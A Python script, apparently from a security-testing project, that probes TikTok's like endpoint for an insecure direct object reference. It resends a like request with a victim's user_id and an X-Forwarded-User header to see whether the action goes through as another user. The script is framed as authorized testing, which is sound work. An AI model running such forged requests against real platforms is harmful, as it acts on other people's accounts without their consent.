#!/usr/bin/env python3
"""
IDOR (Insecure Direct Object Reference) Tester for TikTok Likes
Authorized security testing only.
"""

import sys
import json
import time
from typing import Dict, Optional
sys.path.append('../../')

from src.utils.request_helper import TikTokRequest
from src.utils.logger import setup_logger
from src.utils.config import TikTokConfig

logger = setup_logger(__name__)

class IDORTester:
    def __init__(self):
        self.client = TikTokRequest()
        self.config = TikTokConfig()
        
    def test_like_idor(self, target_video_id: str, victim_user_id: str) -> bool:
        """
        Test if we can like a video on behalf of another user.
        Returns True if vulnerability exists.
        """
        logger.info(f"Testing IDOR on video {target_video_id} for user {victim_user_id}")
        
        # 1. First, like with our own account (baseline)
        payload = {
            'aweme_id': target_video_id,
            'type': 1,  # 1 = like, 0 = unlike
            'action': 1,
        }
        
        response = self.client.post(
            self.config.ENDPOINTS['like'],
            data=payload
        )
        
        if response.status_code != 200:
            logger.error(f"Baseline like failed: {response.status_code}")
            return False
            
        logger.info("Baseline like successful")
        
        # 2. Now try to modify the request to act as another user
        # Attempt 1: Change user_id in payload
        malicious_payload = payload.copy()
        malicious_payload['user_id'] = victim_user_id
        
        response = self.client.post(
            self.config.ENDPOINTS['like'],
            data=malicious_payload,
            extra_headers={'X-Forwarded-User': victim_user_id}
        )
        
        # Analyze response
        if response.status_code == 200:
            data = response.json()
            if data.get('status_code') == 0:
                logger.warning(f"⚠️ POTENTIAL IDOR: Liked as user {victim_user_id}")
                return True
                
        logger.info("No IDOR vulnerability detected")
        return False
        
    def test_follow_idor(self, target_user_id: str, victim_user_id: str) -> bool:
        """Test IDOR in follow functionality."""
        # Similar implementation
        pass

if __name__ == "__main__":
    # Example usage (with test data)
    tester = IDORTester()
    
    # Use test accounts and videos from config
    test_video = TikTokConfig.TEST_VIDEOS[0]
    test_user = TikTokConfig.TEST_ACCOUNTS['account2']['user_id']
    
    result = tester.test_like_idor(test_video, test_user)
    
    if result:
        print("IDOR vulnerability detected - document immediately!")
    else:
        print("No IDOR detected")
